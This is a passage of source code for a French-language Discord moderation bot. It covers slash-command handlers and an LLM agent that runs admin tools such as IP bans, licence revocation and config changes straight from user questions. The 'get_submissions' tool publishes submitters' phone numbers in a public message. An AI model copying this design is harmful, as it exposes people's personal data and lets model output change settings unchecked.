      guild_id: guildId,
      channel_id: channelId,
      counter_type: counterType
    });

    if (error && error.code === '23505') {
      return ephemeral(`❌ Un compteur existe déjà pour ce salon.`);
    }

    return publicMsg(`✅ Compteur \`${counterType}\` créé dans <#${channelId}>.`);
  }

  if (action === 'delete') {
    if (!channelId) {
      return ephemeral(`❌ Veuillez spécifier un salon.`);
    }

    const { data } = await supabase
      .from('counters')
      .delete()
      .eq('guild_id', guildId)
      .eq('channel_id', channelId)
      .select();

    if (!data || data.length === 0) {
      return ephemeral(`❌ Aucun compteur trouvé pour ce salon.`);
    }

    return publicMsg(`✅ Compteur supprimé.`);
  }

  return ephemeral(`❌ Action inconnue.`);
}

// Hidereply command
async function handleHidereply(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const state = getOption(interaction.data.options, 'etat') as string;
  const enabled = state === 'on';

  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    hide_no_permission_reply: enabled,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  return publicMsg(`✅ Réponses de permission ${enabled ? 'masquées' : 'affichées'}.`);
}

// Rename ticket command
async function handleRename(interaction: any, supabase: any) {
  const channelId = interaction.channel_id;
  const newName = getOption(interaction.data.options, 'nom') as string;

  // Check if this is a ticket channel
  const { data: ticket } = await supabase
    .from('tickets')
    .select('*')
    .eq('channel_id', channelId)
    .single();

  if (!ticket) {
    return ephemeral(`❌ Cette commande ne peut être utilisée que dans un ticket.`);
  }

  const res = await discordFetch(`/channels/${channelId}`, {
    method: 'PATCH',
    body: JSON.stringify({ name: newName })
  });

  if (!res.ok) {
    return ephemeral(`❌ Impossible de renommer le salon.`);
  }

  return publicMsg(`✅ Ticket renommé en **${newName}**.`);
}

// Rolemenu command
async function handleRolemenu(interaction: any) {
  const title = getOption(interaction.data.options, 'titre') as string;
  const rolesStr = getOption(interaction.data.options, 'roles') as string;
  const messageId = getOption(interaction.data.options, 'message_id') as string;
  const channelId = interaction.channel_id;

  const roleIds = rolesStr.split(',').map(r => r.trim()).filter(r => r);

  if (roleIds.length === 0) {
    return ephemeral(`❌ Veuillez spécifier au moins un rôle.`);
  }

  const components = [{
    type: 1,
    components: [{
      type: 3,
      custom_id: 'rolemenu_select',
      placeholder: 'Sélectionnez un rôle',
      min_values: 0,
      max_values: roleIds.length,
      options: roleIds.map(id => ({
        label: `Rôle ${id.slice(-4)}`,
        value: id,
        description: `Ajouter/retirer ce rôle`
      }))
    }]
  }];

  const embed = {
    title: `🎭 ${title}`,
    description: 'Sélectionnez les rôles que vous souhaitez obtenir.',
    color: 0x3B82F6
  };

  if (messageId) {
    // Update existing message
    const res = await discordFetch(`/channels/${channelId}/messages/${messageId}`, {
      method: 'PATCH',
      body: JSON.stringify({ embeds: [embed], components })
    });

    if (!res.ok) {
      return ephemeral(`❌ Impossible de modifier le message.`);
    }

    return ephemeral(`✅ Menu de rôles mis à jour.`);
  }

  // Create new message
  await discordFetch(`/channels/${channelId}/messages`, {
    method: 'POST',
    body: JSON.stringify({ embeds: [embed], components })
  });

  return ephemeral(`✅ Menu de rôles créé.`);
}

// Showpic command
async function handleShowpic(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const state = getOption(interaction.data.options, 'etat') as string;
  const channelId = getOption(interaction.data.options, 'salon') as string;
  const enabled = state === 'on';

  const updates: any = {
    id: guildId,
    guild_id: guildId,
    showpic_enabled: enabled,
    updated_at: new Date().toISOString()
  };

  if (channelId) {
    updates.showpic_channel_id = channelId;
  }

  await supabase.from('guild_config').upsert(updates, { onConflict: 'guild_id' });

  if (enabled && channelId) {
    return publicMsg(`✅ Snipe de photo de profil activé dans <#${channelId}>.`);
  }
  return publicMsg(`✅ Snipe de photo de profil ${enabled ? 'activé' : 'désactivé'}.`);
}

// Soutien command
async function handleSoutien(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;
  const roleId = getOption(interaction.data.options, 'role') as string;

  if (action === 'list') {
    const { data: roles } = await supabase
      .from('support_roles')
      .select('*')
      .eq('guild_id', guildId);

    if (!roles || roles.length === 0) {
      return ephemeral(`📋 Aucun rôle de soutien configuré.`);
    }

    const list = roles.map((r: any, i: number) => 
      `**${i + 1}.** <@&${r.role_id}> ${r.nolog ? '(logs ignorés)' : ''}`
    ).join('\n');

    return ephemeral('', [{
      title: '💪 Rôles de Soutien',
      description: list,
      color: 0x22C55E
    }]);
  }

  if (action === 'add') {
    if (!roleId) {
      return ephemeral(`❌ Veuillez spécifier un rôle.`);
    }

    const { error } = await supabase.from('support_roles').insert({
      guild_id: guildId,
      role_id: roleId
    });

    if (error && error.code === '23505') {
      return ephemeral(`❌ Ce rôle est déjà un rôle de soutien.`);
    }

    return publicMsg(`✅ <@&${roleId}> ajouté aux rôles de soutien.`);
  }

  if (action === 'remove') {
    if (!roleId) {
      return ephemeral(`❌ Veuillez spécifier un rôle.`);
    }

    const { data } = await supabase
      .from('support_roles')
      .delete()
      .eq('guild_id', guildId)
      .eq('role_id', roleId)
      .select();

    if (!data || data.length === 0) {
      return ephemeral(`❌ Ce rôle n'est pas un rôle de soutien.`);
    }

    return publicMsg(`✅ <@&${roleId}> retiré des rôles de soutien.`);
  }

  return ephemeral(`❌ Action inconnue.`);
}

// Soutien nolog command
async function handleSoutienNolog(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const state = getOption(interaction.data.options, 'etat') as string;
  const nolog = state === 'on';

  await supabase
    .from('support_roles')
    .update({ nolog })
    .eq('guild_id', guildId);

  return publicMsg(`✅ Logs des rôles de soutien ${nolog ? 'ignorés' : 'activés'}.`);
}

// Piconly command
async function handlePiconly(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;
  const channelId = getOption(interaction.data.options, 'salon') as string;

  if (action === 'list') {
    const { data: channels } = await supabase
      .from('piconly_channels')
      .select('*')
      .eq('guild_id', guildId);

    if (!channels || channels.length === 0) {
      return ephemeral(`📷 Aucun salon photo configuré.`);
    }

    const list = channels.map((c: any, i: number) => 
      `**${i + 1}.** <#${c.channel_id}>`
    ).join('\n');

    return ephemeral('', [{
      title: '📷 Salons Photos Uniquement',
      description: list,
      color: 0x8B5CF6
    }]);
  }

  if (action === 'add') {
    if (!channelId) {
      return ephemeral(`❌ Veuillez spécifier un salon.`);
    }

    const { error } = await supabase.from('piconly_channels').insert({
      guild_id: guildId,
      channel_id: channelId
    });

    if (error && error.code === '23505') {
      return ephemeral(`❌ Ce salon est déjà configuré.`);
    }

    return publicMsg(`✅ <#${channelId}> est maintenant un salon photos uniquement.`);
  }

  if (action === 'remove') {
    if (!channelId) {
      return ephemeral(`❌ Veuillez spécifier un salon.`);
    }

    const { data } = await supabase
      .from('piconly_channels')
      .delete()
      .eq('guild_id', guildId)
      .eq('channel_id', channelId)
      .select();

    if (!data || data.length === 0) {
      return ephemeral(`❌ Ce salon n'est pas configuré.`);
    }

    return publicMsg(`✅ <#${channelId}> n'est plus un salon photos uniquement.`);
  }

  return ephemeral(`❌ Action inconnue.`);
}

// Ticket panel command
async function handleTicketPanel(interaction: any) {
  const channelId = getOption(interaction.data.options, 'salon') as string || interaction.channel_id;

  const embed = {
    title: '🎫 Système de Tickets',
    description: '**Besoin d\'aide ?**\n\nCliquez sur le bouton ci-dessous pour ouvrir un ticket.\nNotre équipe vous répondra dans les plus brefs délais.',
    color: 0x3B82F6,
    footer: { text: 'Support disponible 24/7' }
  };

  const components = [{
    type: 1,
    components: [{
      type: 2,
      style: 1,
      label: '📩 Ouvrir un ticket',
      custom_id: 'open_ticket'
    }]
  }];

  await discordFetch(`/channels/${channelId}/messages`, {
    method: 'POST',
    body: JSON.stringify({ embeds: [embed], components })
  });

  return ephemeral(`✅ Panneau de tickets envoyé dans <#${channelId}>.`);
}

// Ticket config
async function handleTicketConfig(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const categoryId = getOption(interaction.data.options, 'categorie') as string;
  const roleId = getOption(interaction.data.options, 'role_support') as string;

  await supabase.from('guild_config').upsert({
    id: guildId,
    guild_id: guildId,
    ticket_category_id: categoryId,
    ticket_support_role_id: roleId || null,
    updated_at: new Date().toISOString()
  }, { onConflict: 'guild_id' });

  return publicMsg(`✅ Configuration tickets sauvegardée.${roleId ? ` Support: <@&${roleId}>` : ''}`);
}

// Avatar command
async function handleAvatar(interaction: any) {
  const targetId = getOption(interaction.data.options, 'membre') as string || interaction.member.user.id;

  const userRes = await discordFetch(`/users/${targetId}`);
  const user = await userRes.json();

  if (!user.avatar) {
    return ephemeral(`❌ Cet utilisateur n'a pas d'avatar.`);
  }

  const avatarUrl = `https://cdn.discordapp.com/avatars/${targetId}/${user.avatar}.png?size=1024`;

  return publicMsg('', [{
    title: `🖼️ Avatar de ${user.username}`,
    image: { url: avatarUrl },
    color: 0x2B2D31
  }]);
}

// Banner command
async function handleBanner(interaction: any) {
  const targetId = getOption(interaction.data.options, 'membre') as string || interaction.member.user.id;

  const userRes = await discordFetch(`/users/${targetId}`);
  const user = await userRes.json();

  if (!user.banner) {
    return ephemeral(`❌ Cet utilisateur n'a pas de bannière.`);
  }

  const bannerUrl = `https://cdn.discordapp.com/banners/${targetId}/${user.banner}.png?size=1024`;

  return publicMsg('', [{
    title: `🖼️ Bannière de ${user.username}`,
    image: { url: bannerUrl },
    color: 0x2B2D31
  }]);
}

// Ping command
function handlePing(interaction: any) {
  const start = Date.now();
  const apiLatency = start - new Date(interaction.id.slice(0, -10)).getTime() / 4194.304;
  
  return publicMsg('', [{
    title: '🏓 Pong!',
    description: `**Latence API:** ~${Math.round(apiLatency)}ms`,
    color: 0x22C55E
  }]);
}

// Payment info command (Créateur only) - reads from DB
async function handlePayment(interaction: any, supabase: any) {
  const userId = interaction.member?.user?.id || interaction.user?.id;
  
  // Only creators can use this command
  if (!isCreateur(userId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs.`);
  }

  // Get payment config from database
  const { data: config } = await supabase
    .from('payment_config')
    .select('*')
    .eq('id', 'main')
    .single();

  const paypalEmail = config?.paypal_email || 'Non configuré';
  const litecoinAddress = config?.ltc_address || 'Non configuré';

  return publicMsg('', [{
    title: '💳 Informations de Paiement',
    description: 'Voici les différentes méthodes de paiement acceptées pour l\'achat de licences.',
    color: 0x3B82F6,
    fields: [
      {
        name: '💰 PayPal',
        value: `\`\`\`${paypalEmail}\`\`\``,
        inline: false
      },
      {
        name: '🪙 Litecoin (LTC)',
        value: `\`\`\`${litecoinAddress}\`\`\``,
        inline: false
      },
      {
        name: '📋 Instructions',
        value: '1. Effectuez le paiement via PayPal ou Litecoin\n2. Envoyez une preuve de paiement\n3. Recevez votre licence instantanément',
        inline: false
      }
    ],
    footer: { text: 'Protect Bot - Paiements sécurisés' },
    timestamp: new Date().toISOString()
  }]);
}

// AI AGENT - VRAI AGENT INTELLIGENT AVEC TOOL CALLING
async function handleIA(interaction: any, supabase: any) {
  const originalQuestion = interaction.data.options?.find((o: any) => o.name === 'question')?.value || '';
  const userId = interaction.member?.user?.id || interaction.user?.id;
  const guildId = interaction.guild_id;
  const userName = interaction.member?.user?.username || interaction.user?.username || 'Utilisateur';
  
  if (!originalQuestion) {
    return ephemeral('❌ Tu dois poser une question.');
  }

  const isAdmin = isCreateur(userId);
  const canExecuteActions = isAdmin || await isOwner(supabase, guildId, userId);

  if (!canExecuteActions) {
    return ephemeral('❌ Seuls les créateurs et bot owners peuvent utiliser cette commande.');
  }

  console.log(`[IA Agent] User ${userId}: ${originalQuestion}`);

  const LOVABLE_API_KEY = Deno.env.get('LOVABLE_API_KEY');
  if (!LOVABLE_API_KEY) {
    return ephemeral('❌ API IA non configurée.');
  }

  try {
    // Définition des tools disponibles pour l'agent
    const tools = [
      {
        type: "function",
        function: {
          name: "get_stats",
          description: "Obtenir les statistiques du site (visites, soumissions, taux de conversion)",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "update_stats_interval",
          description: "Modifier l'intervalle de mise à jour des statistiques Discord",
          parameters: {
            type: "object",
            properties: { seconds: { type: "number", description: "Nouvel intervalle en secondes (10-300)" } },
            required: ["seconds"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "get_submissions",
          description: "Lister les dernières soumissions du formulaire",
          parameters: {
            type: "object",
            properties: { limit: { type: "number", description: "Nombre de soumissions à afficher (max 20)" } },
            required: []
          }
        }
      },
      {
        type: "function",
        function: {
          name: "ban_ip",
          description: "Bannir une adresse IP du site",
          parameters: {
            type: "object",
            properties: { ip: { type: "string", description: "Adresse IP à bannir" }, reason: { type: "string", description: "Raison du ban" } },
            required: ["ip"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "unban_ip",
          description: "Débannir une adresse IP",
          parameters: {
            type: "object",
            properties: { ip: { type: "string", description: "Adresse IP à débannir" } },
            required: ["ip"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "list_banned_ips",
          description: "Lister toutes les IPs bannies",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "create_license",
          description: "Créer une nouvelle licence pour le bot (créateurs seulement)",
          parameters: {
            type: "object",
            properties: {
              plan_type: { type: "string", enum: ["standard", "premium", "lifetime"], description: "Type de licence" },
              duration_days: { type: "number", description: "Durée en jours (null pour lifetime)" }
            },
            required: ["plan_type"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "list_licenses",
          description: "Lister les licences actives du bot",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "revoke_license",
          description: "Révoquer une licence existante",
          parameters: {
            type: "object",
            properties: { guild_id: { type: "string", description: "ID du serveur Discord" } },
            required: ["guild_id"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "get_guild_config",
          description: "Obtenir la configuration actuelle du serveur (antilink, antispam, antiraid, etc.)",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "update_guild_config",
          description: "Activer/désactiver une fonctionnalité du serveur",
          parameters: {
            type: "object",
            properties: {
              feature: { type: "string", enum: ["antilink", "antispam", "antiraid", "captcha", "showpic"], description: "Fonctionnalité à modifier" },
              enabled: { type: "boolean", description: "Activer (true) ou désactiver (false)" }
            },
            required: ["feature", "enabled"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "update_antispam_settings",
          description: "Modifier les paramètres antispam",
          parameters: {
            type: "object",
            properties: {
              max_messages: { type: "number", description: "Nombre max de messages" },
              timeframe: { type: "number", description: "Période en secondes" }
            },
            required: []
          }
        }
      },
      {
        type: "function",
        function: {
          name: "update_antiraid_settings",
          description: "Modifier les paramètres antiraid",
          parameters: {
            type: "object",
            properties: {
              max_joins: { type: "number", description: "Nombre max de joins" },
              timeframe: { type: "number", description: "Période en secondes" }
            },
            required: []
          }
        }
      },
      {
        type: "function",
        function: {
          name: "list_sanctions",
          description: "Lister les dernières sanctions du serveur",
          parameters: {
            type: "object",
            properties: { limit: { type: "number", description: "Nombre de sanctions" } },
            required: []
          }
        }
      },
      {
        type: "function",
        function: {
          name: "list_bot_owners",
          description: "Lister les propriétaires du bot pour ce serveur",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "list_bot_buyers",
          description: "Lister les acheteurs du bot pour ce serveur",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "disable_command",
          description: "Désactiver une commande du bot sur ce serveur",
          parameters: {
            type: "object",
            properties: { command_name: { type: "string", description: "Nom de la commande à désactiver (ex: redeem, help, ban)" } },
            required: ["command_name"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "enable_command",
          description: "Réactiver une commande du bot sur ce serveur",
          parameters: {
            type: "object",
            properties: { command_name: { type: "string", description: "Nom de la commande à réactiver" } },
            required: ["command_name"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "list_disabled_commands",
          description: "Lister les commandes désactivées sur ce serveur",
          parameters: { type: "object", properties: {}, required: [] }
        }
      },
      {
        type: "function",
        function: {
          name: "set_welcome_message",
          description: "Configurer le message de bienvenue du serveur",
          parameters: {
            type: "object",
            properties: {
              message: { type: "string", description: "Message de bienvenue (utilise {user} pour mentionner)" },
              channel_id: { type: "string", description: "ID du salon de bienvenue" }
            },
            required: ["message"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "set_goodbye_message",
          description: "Configurer le message d'au revoir du serveur",
          parameters: {
            type: "object",
            properties: { message: { type: "string", description: "Message d'au revoir" } },
            required: ["message"]
          }
        }
      },
      {
        type: "function",
        function: {
          name: "general_response",
          description: "Répondre à une question générale qui ne nécessite pas d'action",
          parameters: {
            type: "object",
            properties: { response: { type: "string", description: "La réponse à donner" } },
            required: ["response"]
          }
        }
      }
    ];

    // Appel à l'IA avec les tools
    const response = await fetch('https://ai.gateway.lovable.dev/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${LOVABLE_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: 'google/gemini-3-flash-preview',
        messages: [
          {
            role: 'system',
            content: `Tu es l'IA du bot Discord "Protect Bot". Tu peux exécuter des actions sur le bot et le site via les tools disponibles.

RÈGLES:
- Analyse la demande de l'utilisateur et choisis le tool approprié
- Tu peux modifier la config, gérer les licences, bannir des IPs, désactiver des commandes, etc.
- Pour désactiver/supprimer une commande, utilise "disable_command"
- Pour réactiver une commande, utilise "enable_command"
- Les noms de commandes sont sans le "/" (ex: "redeem", "help", "ban")
- Si c'est une question générale sans action, utilise "general_response"
- Réponds TOUJOURS en français
- Sois concis et précis

CONTEXTE:
- Guild ID: ${guildId}
- User ID: ${userId}
- Est créateur: ${isAdmin}

COMMANDES DISPONIBLES DU BOT: help, say, stats, ban, unban, kick, mute, unmute, clear, lock, unlock, addrole, delrole, sanctions, banlist, mutelist, warn, sanctions-clear, massiverole, unmassiverole, renew, embed, serverinfo, userinfo, roleinfo, bringall, slowmode, temprole, note, notes, announce, ticket, close, add, remove, ticketconfig, logs, setwelcome, antiraid, captcha, antilink, antilink-ignore, antilink-sanction, antilink-type, antispam, antispam-config, showpic, piconly, piconly-remove, piconly-list, counter, counter-list, counter-remove, setowner, delowner, listowners, buyer, unbuyer, listbuyers, support, unsupport, listsupports, nolog, disable, enable, listdisabled, config, hidereply, license, redeem, createlicense, listlicenses, revoke, listallowners, listallbuyers, buy, setpaypal, payment, banip, unbanip, listbannedips, settoken, removetoken, ia, stats-perma`
          },
          { role: 'user', content: originalQuestion }
        ],
        tools,
        tool_choice: 'auto'
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('[IA Agent] API Error:', errorText);
      return ephemeral(`❌ Erreur API IA: ${response.status}`);
    }

    const data = await response.json();
    const message = data.choices?.[0]?.message;

    if (!message) {
      return ephemeral('❌ Réponse IA invalide.');
    }

    // Si l'IA a choisi d'appeler un tool
    if (message.tool_calls && message.tool_calls.length > 0) {
      const toolResults: string[] = [];

      for (const toolCall of message.tool_calls) {
        const fnName = toolCall.function.name;
        let args: any = {};
        try {
          args = JSON.parse(toolCall.function.arguments || '{}');
        } catch { args = {}; }

        console.log(`[IA Agent] Tool call: ${fnName}`, args);

        let result = '';

        switch (fnName) {
          case 'get_stats': {
            const [{ count: visits }, { count: submissions }, { count: approved }] = await Promise.all([
              supabase.from('visits').select('*', { count: 'exact', head: true }),
              supabase.from('submissions').select('*', { count: 'exact', head: true }),
              supabase.from('submissions').select('*', { count: 'exact', head: true }).eq('status', 'approved')
            ]);
            const rate = submissions && submissions > 0 ? ((approved! / submissions) * 100).toFixed(1) : '0';
            result = `📊 **Statistiques du site:**\n• Visites: **${visits || 0}**\n• Soumissions: **${submissions || 0}**\n• Approuvées: **${approved || 0}**\n• Taux: **${rate}%**`;
            break;
          }

          case 'update_stats_interval': {
            const interval = Math.min(300, Math.max(10, args.seconds || 30));
            await supabase.from('stats_config').update({ stats_interval_seconds: interval }).eq('id', 'main');
            result = `✅ Intervalle des stats modifié à **${interval} secondes**`;
            break;
          }

          case 'get_submissions': {
            const limit = Math.min(20, args.limit || 10);
            const { data: subs } = await supabase.from('submissions').select('*').order('created_at', { ascending: false }).limit(limit);
            if (subs && subs.length > 0) {
              result = `📝 **${subs.length} dernières soumissions:**\n` + 
                subs.map((s: any) => `• \`${s.username}\` - ${s.phone} - ${s.status === 'approved' ? '✅' : s.status === 'rejected' ? '❌' : '⏳'}`).join('\n');
            } else {
              result = `Aucune soumission trouvée.`;
            }
            break;
          }

          case 'ban_ip': {
            await supabase.from('banned_ips').insert({ ip_address: args.ip, reason: args.reason || 'Banni via IA', banned_by: userId });
            result = `🚫 IP **${args.ip}** bannie du site`;
            break;
          }

          case 'unban_ip': {
            await supabase.from('banned_ips').delete().eq('ip_address', args.ip);
            result = `✅ IP **${args.ip}** débannie`;
            break;
          }

          case 'list_banned_ips': {
            const { data: ips } = await supabase.from('banned_ips').select('*').order('created_at', { ascending: false });
            if (ips && ips.length > 0) {
              result = `🚫 **${ips.length} IPs bannies:**\n` + 
                ips.slice(0, 15).map((ip: any) => `• \`${ip.ip_address}\` - ${ip.reason || 'Pas de raison'}`).join('\n');
            } else {
              result = `Aucune IP bannie.`;
            }
            break;
          }

          case 'create_license': {
            if (!isAdmin) {
              result = `❌ Seuls les créateurs peuvent créer des licences.`;
            } else {
              const planType = args.plan_type || 'standard';
              const durationDays = planType === 'lifetime' ? null : (args.duration_days || 30);
              const key = `PROTECT-${planType.toUpperCase()}-${crypto.randomUUID().split('-')[0].toUpperCase()}`;
              await supabase.from('valid_licenses').insert({ license_key: key, plan_type: planType, duration_days: durationDays });
              result = `🔑 **Licence créée!**\n\`\`\`${key}\`\`\`\n• Type: **${planType}**\n• Durée: **${planType === 'lifetime' ? 'Illimitée' : `${durationDays} jours`}**`;
            }
            break;
          }

          case 'list_licenses': {
            const { data: licenses } = await supabase.from('bot_licenses').select('*').eq('is_active', true).order('created_at', { ascending: false }).limit(15);
            if (licenses && licenses.length > 0) {
              result = `🔑 **${licenses.length} licences actives:**\n` +
                licenses.map((l: any) => `• \`${l.guild_id}\` - ${l.plan_type} ${l.expires_at ? `(expire ${new Date(l.expires_at).toLocaleDateString('fr-FR')})` : '(lifetime)'}`).join('\n');
            } else {
              result = `Aucune licence active.`;
            }
            break;
          }

          case 'revoke_license': {
            if (!isAdmin) {
              result = `❌ Seuls les créateurs peuvent révoquer des licences.`;
            } else {
              await supabase.from('bot_licenses').update({ is_active: false }).eq('guild_id', args.guild_id);
              result = `✅ Licence du serveur \`${args.guild_id}\` révoquée`;
            }
            break;
          }

          case 'get_guild_config': {
            const { data: config } = await supabase.from('guild_config').select('*').eq('guild_id', guildId).single();
            const { data: statsConfig } = await supabase.from('stats_config').select('*').eq('id', 'main').single();
            if (config) {
              result = `⚙️ **Configuration du serveur:**\n` +
                `• Antilink: ${config.antilink_enabled ? '✅' : '❌'}\n` +
                `• Antispam: ${config.antispam_enabled ? '✅' : '❌'} (${config.antispam_max_messages || 5} msg/${config.antispam_timeframe || 5}s)\n` +
                `• Antiraid: ${config.antiraid_enabled ? '✅' : '❌'} (${config.antiraid_max_joins || 10} joins/${config.antiraid_timeframe || 60}s)\n` +
                `• Captcha: ${config.captcha_enabled ? '✅' : '❌'}\n` +
                `• Showpic: ${config.showpic_enabled ? '✅' : '❌'}\n\n` +
                `📊 **Stats:** Intervalle **${statsConfig?.stats_interval_seconds || 30}s**`;
            } else {
              result = `Aucune configuration pour ce serveur.`;
            }
            break;
          }

          case 'update_guild_config': {
            const featureMap: Record<string, string> = {
              antilink: 'antilink_enabled',
              antispam: 'antispam_enabled',
              antiraid: 'antiraid_enabled',
              captcha: 'captcha_enabled',
              showpic: 'showpic_enabled'
            };
            const column = featureMap[args.feature];
            if (column) {
              await supabase.from('guild_config').upsert({
                id: guildId, guild_id: guildId, [column]: args.enabled, updated_at: new Date().toISOString()
              }, { onConflict: 'guild_id' });
              result = `✅ **${args.feature}** ${args.enabled ? 'activé' : 'désactivé'}`;
            } else {
              result = `❌ Fonctionnalité inconnue: ${args.feature}`;
            }
            break;
          }

          case 'update_antispam_settings': {
            const updates: any = { updated_at: new Date().toISOString() };
            if (args.max_messages) updates.antispam_max_messages = Math.min(20, Math.max(1, args.max_messages));
            if (args.timeframe) updates.antispam_timeframe = Math.min(60, Math.max(1, args.timeframe));
            await supabase.from('guild_config').upsert({ id: guildId, guild_id: guildId, ...updates }, { onConflict: 'guild_id' });
            result = `✅ Paramètres antispam mis à jour`;
            break;
          }

          case 'update_antiraid_settings': {
            const updates: any = { updated_at: new Date().toISOString() };
            if (args.max_joins) updates.antiraid_max_joins = Math.min(50, Math.max(1, args.max_joins));
            if (args.timeframe) updates.antiraid_timeframe = Math.min(300, Math.max(10, args.timeframe));
            await supabase.from('guild_config').upsert({ id: guildId, guild_id: guildId, ...updates }, { onConflict: 'guild_id' });
            result = `✅ Paramètres antiraid mis à jour`;
            break;
          }

          case 'list_sanctions': {
            const limit = Math.min(20, args.limit || 10);
            const { data: sanctions } = await supabase.from('sanctions').select('*').eq('guild_id', guildId).order('created_at', { ascending: false }).limit(limit);
            if (sanctions && sanctions.length > 0) {
              result = `⚖️ **${sanctions.length} dernières sanctions:**\n` +
                sanctions.map((s: any) => `• <@${s.user_id}> - **${s.type}** - ${s.reason || 'Pas de raison'}`).join('\n');
            } else {
              result = `Aucune sanction sur ce serveur.`;
            }
            break;
          }

          case 'list_bot_owners': {
            const { data: owners } = await supabase.from('bot_owners').select('*').eq('guild_id', guildId);
            if (owners && owners.length > 0) {
              result = `👑 **Bot Owners de ce serveur:**\n` + owners.map((o: any) => `• <@${o.user_id}>`).join('\n');
            } else {
              result = `Aucun bot owner sur ce serveur.`;
            }
            break;
          }

          case 'list_bot_buyers': {
            const { data: buyers } = await supabase.from('bot_buyers').select('*').eq('guild_id', guildId);
            if (buyers && buyers.length > 0) {
              result = `🛒 **Buyers de ce serveur:**\n` + buyers.map((b: any) => `• <@${b.user_id}>`).join('\n');
            } else {
              result = `Aucun buyer sur ce serveur.`;
            }
            break;
          }

          case 'disable_command': {
            const cmdName = args.command_name.toLowerCase().replace(/^\//, '');
            const { data: existing } = await supabase.from('disabled_commands').select('*').eq('guild_id', guildId).eq('command_name', cmdName).single();
            if (existing) {
              result = `⚠️ La commande **/${cmdName}** est déjà désactivée.`;
            } else {
              await supabase.from('disabled_commands').insert({ guild_id: guildId, command_name: cmdName, disabled_by: userId });
              result = `✅ La commande **/${cmdName}** a été désactivée sur ce serveur.`;
            }
            break;
          }

          case 'enable_command': {
            const cmdName = args.command_name.toLowerCase().replace(/^\//, '');
            const { error } = await supabase.from('disabled_commands').delete().eq('guild_id', guildId).eq('command_name', cmdName);
            if (error) {
              result = `❌ Erreur lors de la réactivation de **/${cmdName}**.`;
            } else {
              result = `✅ La commande **/${cmdName}** a été réactivée sur ce serveur.`;
            }
            break;
          }

          case 'list_disabled_commands': {
            const { data: disabled } = await supabase.from('disabled_commands').select('*').eq('guild_id', guildId);
            if (disabled && disabled.length > 0) {
              result = `🚫 **Commandes désactivées:**\n` + disabled.map((d: any) => `• /${d.command_name}`).join('\n');
            } else {
              result = `Aucune commande désactivée sur ce serveur.`;
            }
            break;
          }

          case 'set_welcome_message': {
            const updates: any = { welcome_message: args.message, updated_at: new Date().toISOString() };
            if (args.channel_id) updates.welcome_channel_id = args.channel_id;
            await supabase.from('guild_config').upsert({ id: guildId, guild_id: guildId, ...updates }, { onConflict: 'guild_id' });
            result = `✅ Message de bienvenue configuré:\n"${args.message}"`;
            break;
          }

          case 'set_goodbye_message': {
            await supabase.from('guild_config').upsert({
              id: guildId, guild_id: guildId, goodbye_message: args.message, updated_at: new Date().toISOString()
            }, { onConflict: 'guild_id' });
            result = `✅ Message d'au revoir configuré:\n"${args.message}"`;
            break;
          }

          case 'general_response': {
            result = args.response;
            break;
          }

          default:
            result = `❓ Action inconnue: ${fnName}`;
        }

        toolResults.push(result);
      }

      const finalResult = toolResults.join('\n\n');
      return publicMsg('', [{
        title: '🤖 Action Exécutée',
        description: finalResult,
        color: 0x22C55E,
        fields: [{ name: '❓ Demande', value: originalQuestion.length > 500 ? originalQuestion.substring(0, 500) + '...' : originalQuestion, inline: false }],
        footer: { text: `${userName} • Protect Bot IA` },
        timestamp: new Date().toISOString()
      }]);
    }

    // Si l'IA a juste répondu du texte
    const content = message.content || "Je n'ai pas compris ta demande. Essaie d'être plus précis.";
    return publicMsg('', [{
      title: '🤖 Réponse',
      description: content,
      color: 0x8B5CF6,
      fields: [{ name: '❓ Demande', value: originalQuestion.length > 500 ? originalQuestion.substring(0, 500) + '...' : originalQuestion, inline: false }],
      footer: { text: `${userName} • Protect Bot IA` },
      timestamp: new Date().toISOString()
    }]);

  } catch (error) {
    console.error('[IA Agent] Error:', error);
    return ephemeral(`❌ Erreur: ${error instanceof Error ? error.message : 'Erreur inconnue'}`);
  }
}

// ========== DMALL COMMAND ==========
async function handleDmall(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const userId = interaction.member?.user?.id;
  const message = getOption(interaction.data.options, 'message') as string;

  if (!message) {
    return ephemeral('❌ Veuillez fournir un message.');
  }

  // Only server owner or créateurs can use this
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();
  
  if (guild.owner_id !== userId && !isCreateur(userId)) {
    return ephemeral('❌ Seul le propriétaire du serveur ou un créateur peut utiliser cette commande.');
  }

  // Respond immediately with deferred message
  // We'll use a follow-up approach: respond first, then process in background
  const appId = Deno.env.get('DISCORD_APPLICATION_ID');

  // Send initial response
  const initialResponse = new Response(JSON.stringify({
